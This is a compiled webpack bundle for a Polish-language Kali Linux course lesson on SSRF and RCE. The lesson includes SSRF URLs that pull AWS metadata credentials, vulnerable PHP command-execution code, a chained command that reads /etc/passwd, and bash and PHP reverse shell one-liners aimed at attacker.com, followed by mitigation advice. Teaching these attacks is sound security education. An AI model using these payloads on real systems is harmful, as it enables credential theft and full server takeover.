"use strict";(self.webpackChunkmy_page=self.webpackChunkmy_page||[]).push([[5638],{28453:(e,n,a)=>{a.d(n,{R:()=>i,x:()=>c});var r=a(96540);const s={},o=r.createContext(s);function i(e){const n=r.useContext(o);return r.useMemo((function(){return"function"==typeof e?e(n):{...n,...e}}),[n,e])}function c(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(s):e.components||s:i(e.components),r.createElement(o.Provider,{value:n},e.children)}},96404:(e,n,a)=>{a.r(n),a.d(n,{assets:()=>t,contentTitle:()=>c,default:()=>h,frontMatter:()=>i,metadata:()=>r,toc:()=>d});const r=JSON.parse('{"id":"kurs-kali-linux/ssrf-rce","title":"\ud83d\udea8 Server-Side Request Forgery (SSRF) & Remote Code Execution (RCE)","description":"SSRF i RCE to jedne z najbardziej niebezpiecznych podatno\u015bci w aplikacjach webowych. Pozwalaj\u0105 atakuj\u0105cym na wykonywanie nieautoryzowanych \u017c\u0105da\u0144 wewn\u0119trznych oraz zdalne wykonywanie kodu na serwerze.","source":"@site/docs/kurs-kali-linux/12-ssrf-rce.md","sourceDirName":"kurs-kali-linux","slug":"/kurs-kali-linux/ssrf-rce","permalink":"/docs/kurs-kali-linux/ssrf-rce","draft":false,"unlisted":false,"editUrl":"https://github.com/przemyslvw/my-page/edit/master/docs/kurs-kali-linux/12-ssrf-rce.md","tags":[],"version":"current","sidebarPosition":12,"frontMatter":{"id":"ssrf-rce","title":"\ud83d\udea8 Server-Side Request Forgery (SSRF) & Remote Code Execution (RCE)","sidebar_position":12},"sidebar":"tutorialSidebar","previous":{"title":"\u26a0\ufe0f Security Misconfigurations i ataki na pliki","permalink":"/docs/kurs-kali-linux/security-misconfigurations"},"next":{"title":"\ud83e\udd16 Automatyzacja i eksploatacja","permalink":"/docs/kurs-kali-linux/automatyzacja-eksploatacja"}}');var s=a(74848),o=a(28453);const i={id:"ssrf-rce",title:"\ud83d\udea8 Server-Side Request Forgery (SSRF) & Remote Code Execution (RCE)",sidebar_position:12},c="\ud83d\udea8 Server-Side Request Forgery (SSRF) & Remote Code Execution (RCE)",t={},d=[{value:"\ud83d\udd0d Server-Side Request Forgery (SSRF)",id:"-server-side-request-forgery-ssrf",level:2},{value:"<strong>1\ufe0f\u20e3 SSRF w chmurze</strong>",id:"1\ufe0f\u20e3-ssrf-w-chmurze",level:3},{value:"<strong>Przyk\u0142adowe podatne \u017c\u0105danie</strong>",id:"przyk\u0142adowe-podatne-\u017c\u0105danie",level:4},{value:"<strong>2\ufe0f\u20e3 Wykorzystanie SSRF do dost\u0119pu do wewn\u0119trznych zasob\xf3w</strong>",id:"2\ufe0f\u20e3-wykorzystanie-ssrf-do-dost\u0119pu-do-wewn\u0119trznych-zasob\xf3w",level:3},{value:"\ud83d\udca5 Remote Code Execution (RCE)",id:"-remote-code-execution-rce",level:2},{value:"<strong>1\ufe0f\u20e3 Wykrywanie podatno\u015bci RCE</strong>",id:"1\ufe0f\u20e3-wykrywanie-podatno\u015bci-rce",level:3},{value:"<strong>Przyk\u0142adowy podatny kod w PHP</strong>",id:"przyk\u0142adowy-podatny-kod-w-php",level:4},{value:"<strong>2\ufe0f\u20e3 Eksploatacja RCE</strong>",id:"2\ufe0f\u20e3-eksploatacja-rce",level:3},{value:"<strong>Wstrzykiwanie komend systemowych</strong>",id:"wstrzykiwanie-komend-systemowych",level:4},{value:"<strong>Uzyskanie Reverse Shell</strong>",id:"uzyskanie-reverse-shell",level:4},{value:"\ud83d\udd10 Jak zabezpieczy\u0107 aplikacj\u0119 przed SSRF i RCE?",id:"-jak-zabezpieczy\u0107-aplikacj\u0119-przed-ssrf-i-rce",level:2}];function l(e){const n={code:"code",h1:"h1",h2:"h2",h3:"h3",h4:"h4",header:"header",hr:"hr",li:"li",p:"p",pre:"pre",strong:"strong",ul:"ul",...(0,o.R)(),...e.components};return(0,s.jsxs)(s.Fragment,{children:[(0,s.jsx)(n.header,{children:(0,s.jsx)(n.h1,{id:"-server-side-request-forgery-ssrf--remote-code-execution-rce",children:"\ud83d\udea8 Server-Side Request Forgery (SSRF) & Remote Code Execution (RCE)"})}),"\n",(0,s.jsx)(n.p,{children:"SSRF i RCE to jedne z najbardziej niebezpiecznych podatno\u015bci w aplikacjach webowych. Pozwalaj\u0105 atakuj\u0105cym na wykonywanie nieautoryzowanych \u017c\u0105da\u0144 wewn\u0119trznych oraz zdalne wykonywanie kodu na serwerze."}),"\n",(0,s.jsx)(n.hr,{}),"\n",(0,s.jsx)(n.h2,{id:"-server-side-request-forgery-ssrf",children:"\ud83d\udd0d Server-Side Request Forgery (SSRF)"}),"\n",(0,s.jsx)(n.p,{children:"SSRF pozwala atakuj\u0105cemu na manipulowanie \u017c\u0105daniami HTTP wysy\u0142anymi przez serwer. Mo\u017ce to prowadzi\u0107 do ujawnienia wewn\u0119trznych zasob\xf3w, eksfiltracji danych lub eskalacji ataku."}),"\n",(0,s.jsx)(n.h3,{id:"1\ufe0f\u20e3-ssrf-w-chmurze",children:(0,s.jsx)(n.strong,{children:"1\ufe0f\u20e3 SSRF w chmurze"})}),"\n",(0,s.jsx)(n.p,{children:"W \u015brodowiskach chmurowych, takich jak AWS, Google Cloud czy Azure, SSRF mo\u017ce by\u0107 wykorzystany do uzyskania kluczy dost\u0119pu i przej\u0119cia infrastruktury."}),"\n",(0,s.jsx)(n.h4,{id:"przyk\u0142adowe-podatne-\u017c\u0105danie",children:(0,s.jsx)(n.strong,{children:"Przyk\u0142adowe podatne \u017c\u0105danie"})}),"\n",(0,s.jsx)(n.p,{children:"Aplikacja pobiera obraz z podanego przez u\u017cytkownika URL:"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-php",children:"file_get_contents($_GET['url']);\n"})}),"\n",(0,s.jsx)(n.p,{children:"Atakuj\u0105cy mo\u017ce u\u017cy\u0107 tego mechanizmu do dost\u0119pu do metadanych chmury AWS:"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-http",children:"http://example.com?url=http://169.254.169.254/latest/meta-data/\n"})}),"\n",(0,s.jsx)(n.p,{children:"Przyk\u0142adowa odpowied\u017a mo\u017ce zawiera\u0107:"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{children:"instance-id: i-1234567890abcdef\nrole-name: admin-role\n"})}),"\n",(0,s.jsx)(n.p,{children:"Aby pobra\u0107 klucz dost\u0119pu AWS:"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-http",children:"http://example.com?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/admin-role\n"})}),"\n",(0,s.jsx)(n.p,{children:"Je\u015bli odpowied\u017a zwr\xf3ci klucz AWS, atakuj\u0105cy mo\u017ce uzyska\u0107 pe\u0142en dost\u0119p do konta chmurowego."}),"\n",(0,s.jsx)(n.h3,{id:"2\ufe0f\u20e3-wykorzystanie-ssrf-do-dost\u0119pu-do-wewn\u0119trznych-zasob\xf3w",children:(0,s.jsx)(n.strong,{children:"2\ufe0f\u20e3 Wykorzystanie SSRF do dost\u0119pu do wewn\u0119trznych zasob\xf3w"})}),"\n",(0,s.jsx)(n.p,{children:"SSRF mo\u017cna tak\u017ce wykorzysta\u0107 do skanowania wewn\u0119trznych system\xf3w lub eksploracji API:"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-http",children:"http://example.com?url=http://127.0.0.1:8080/admin\n"})}),"\n",(0,s.jsx)(n.p,{children:"Je\u015bli serwer odpowiada, atakuj\u0105cy mo\u017ce uzyska\u0107 dost\u0119p do zasob\xf3w, kt\xf3re nie powinny by\u0107 publiczne."}),"\n",(0,s.jsx)(n.p,{children:"SSRF mo\u017ce by\u0107 r\xf3wnie\u017c wykorzystane do atak\xf3w na bazy danych, np. Redis:"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-http",children:"http://example.com?url=redis://127.0.0.1:6379/\n"})}),"\n",(0,s.jsx)(n.p,{children:"Lub do ataku na us\u0142ugi HTTP, np. Elasticsearch:"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-http",children:"http://example.com?url=http://localhost:9200/_search?q=*\n"})}),"\n",(0,s.jsx)(n.hr,{}),"\n",(0,s.jsx)(n.h2,{id:"-remote-code-execution-rce",children:"\ud83d\udca5 Remote Code Execution (RCE)"}),"\n",(0,s.jsx)(n.p,{children:"RCE to krytyczna podatno\u015b\u0107, kt\xf3ra pozwala atakuj\u0105cemu na wykonywanie dowolnych komend systemowych na serwerze."}),"\n",(0,s.jsx)(n.h3,{id:"1\ufe0f\u20e3-wykrywanie-podatno\u015bci-rce",children:(0,s.jsx)(n.strong,{children:"1\ufe0f\u20e3 Wykrywanie podatno\u015bci RCE"})}),"\n",(0,s.jsx)(n.p,{children:"Najcz\u0119stsze miejsca podatne na RCE to:"}),"\n",(0,s.jsxs)(n.ul,{children:["\n",(0,s.jsxs)(n.li,{children:[(0,s.jsx)(n.strong,{children:"Niebezpieczne funkcje w PHP"}),": ",(0,s.jsx)(n.code,{children:"eval()"}),", ",(0,s.jsx)(n.code,{children:"system()"}),", ",(0,s.jsx)(n.code,{children:"exec()"})]}),"\n",(0,s.jsx)(n.li,{children:(0,s.jsx)(n.strong,{children:"Nieprawid\u0142owa obs\u0142uga wej\u015bcia u\u017cytkownika w Python, Node.js, Bash"})}),"\n",(0,s.jsx)(n.li,{children:(0,s.jsx)(n.strong,{children:"\u0179le skonfigurowane API umo\u017cliwiaj\u0105ce zdalne wywo\u0142anie funkcji"})}),"\n"]}),"\n",(0,s.jsx)(n.h4,{id:"przyk\u0142adowy-podatny-kod-w-php",children:(0,s.jsx)(n.strong,{children:"Przyk\u0142adowy podatny kod w PHP"})}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-php",children:"$cmd = $_GET['cmd'];\nsystem($cmd);\n"})}),"\n",(0,s.jsx)(n.p,{children:"Atakuj\u0105cy mo\u017ce wykona\u0107 polecenie systemowe:"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-http",children:"http://example.com?cmd=whoami\n"})}),"\n",(0,s.jsx)(n.h3,{id:"2\ufe0f\u20e3-eksploatacja-rce",children:(0,s.jsx)(n.strong,{children:"2\ufe0f\u20e3 Eksploatacja RCE"})}),"\n",(0,s.jsx)(n.h4,{id:"wstrzykiwanie-komend-systemowych",children:(0,s.jsx)(n.strong,{children:"Wstrzykiwanie komend systemowych"})}),"\n",(0,s.jsx)(n.p,{children:"Je\u015bli aplikacja wykonuje komendy systemowe bez odpowiedniego filtrowania, mo\u017cna je manipulowa\u0107:"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-http",children:"http://example.com?cmd=ls\n"})}),"\n",(0,s.jsxs)(n.p,{children:["Je\u017celi aplikacja u\u017cywa operator\xf3w ",(0,s.jsx)(n.code,{children:"&&"}),", ",(0,s.jsx)(n.code,{children:"|"}),", ",(0,s.jsx)(n.code,{children:";"}),", mo\u017cna \u0142\u0105czy\u0107 komendy:"]}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-http",children:"http://example.com?cmd=whoami;id;cat /etc/passwd\n"})}),"\n",(0,s.jsx)(n.h4,{id:"uzyskanie-reverse-shell",children:(0,s.jsx)(n.strong,{children:"Uzyskanie Reverse Shell"})}),"\n",(0,s.jsx)(n.p,{children:"Je\u015bli aplikacja jest podatna na RCE, mo\u017cna uzyska\u0107 pe\u0142n\u0105 kontrol\u0119 nad serwerem poprzez otwarcie sesji odwrotnej (reverse shell)."}),"\n",(0,s.jsx)(n.p,{children:"Atakuj\u0105cy uruchamia listener na swoim serwerze:"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:"nc -lvnp 4444\n"})}),"\n",(0,s.jsx)(n.p,{children:"Nast\u0119pnie wykonuje na podatnym serwerze polecenie otwieraj\u0105ce sesj\u0119:"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:"bash -i >& /dev/tcp/attacker.com/4444 0>&1\n"})}),"\n",(0,s.jsx)(n.p,{children:"Je\u015bli serwer obs\u0142uguje PHP, mo\u017cna wykona\u0107:"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-php",children:'php -r \'$sock=fsockopen("attacker.com",4444);exec("/bin/sh -i <&3 >&3 2>&3");\'\n'})}),"\n",(0,s.jsx)(n.hr,{}),"\n",(0,s.jsx)(n.h2,{id:"-jak-zabezpieczy\u0107-aplikacj\u0119-przed-ssrf-i-rce",children:"\ud83d\udd10 Jak zabezpieczy\u0107 aplikacj\u0119 przed SSRF i RCE?"}),"\n",(0,s.jsxs)(n.p,{children:["\u2705 ",(0,s.jsxs)(n.strong,{children:["Blokowanie dost\u0119pu do adres\xf3w lokalnych (",(0,s.jsx)(n.code,{children:"127.0.0.1"}),", ",(0,s.jsx)(n.code,{children:"169.254.169.254"}),")"]}),"\n\u2705 ",(0,s.jsx)(n.strong,{children:"Walidacja i whitelisting URL w przypadku pobierania zasob\xf3w"}),"\n\u2705 ",(0,s.jsxs)(n.strong,{children:["Wy\u0142\u0105czanie niebezpiecznych funkcji w PHP (",(0,s.jsx)(n.code,{children:"exec()"}),", ",(0,s.jsx)(n.code,{children:"system()"}),")"]}),"\n\u2705 ",(0,s.jsx)(n.strong,{children:"Stosowanie firewalli aplikacyjnych (WAF) do blokowania podejrzanych \u017c\u0105da\u0144"}),"\n\u2705 ",(0,s.jsx)(n.strong,{children:"Ograniczenie uprawnie\u0144 proces\xf3w dzia\u0142aj\u0105cych w systemie"})]}),"\n",(0,s.jsx)(n.hr,{}),"\n",(0,s.jsxs)(n.p,{children:["SSRF i RCE to podatno\u015bci, kt\xf3re mog\u0105 prowadzi\u0107 do pe\u0142nego przej\u0119cia systemu. Kolejnym krokiem b\u0119dzie analiza podatno\u015bci ",(0,s.jsx)(n.strong,{children:"Platformy do \u0107wicze\u0144 i laby pentesterskie"}),"! \ud83d\ude80"]})]})}function h(e={}){const{wrapper:n}={...(0,o.R)(),...e.components};return n?(0,s.jsx)(n,{...e,children:(0,s.jsx)(l,{...e})}):l(e)}}}]);